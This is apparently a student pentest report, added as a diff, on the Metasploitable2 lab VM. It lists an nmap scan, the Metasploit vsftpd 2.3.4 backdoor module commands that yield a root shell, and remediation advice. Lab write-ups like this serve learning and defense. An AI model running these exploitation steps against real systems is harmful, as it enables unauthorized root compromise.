@@ -1,0 +1,64 @@
+🛡️ Pentest Report: Metasploitable2
+
+Date: 15-06-2025
+Author: Makwana Ansh
+Target IP: 192.168.56.101
+
+1. 🎯 Objective
+To identify and exploit vulnerabilities in the Metasploitable2 system using network reconnaissance and automated exploitation tools.
+
+2. 🛠 Tools Used
+
+    Nmap – for port scanning and service enumeration
+
+    Metasploit Framework – for exploiting known vulnerabilities
+
+3. 🔍 Reconnaissance
+
+Command:
+nmap -A -p- 192.168.56.101
+
+Results:
+
+    Port 21: vsftpd 2.3.4
+
+    Port 22, 23, 80, 3306, and others open
+
+    FTP service shows known backdoor vulnerability
+
+4. 💥 Exploitation (Metasploit)
+
+Steps:
+msfconsole
+
+search vsftpd
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOSTS 192.168.56.101
+
+run
+
+Result:
+
+    Gained remote root shell access
+
+Proof of Access:
+
+whoami  => root
+id      => uid=0(root) gid=0(root)
+
+
+5. ⚠️ Impact
+
+    Root access obtained without authentication
+
+    Full system compromise possible
+
+6. 🛡 Recommendations
+
+    Upgrade to a secure version of vsftpd
+
+    Disable anonymous FTP access
+
+    Implement firewall restrictions and monitoring.
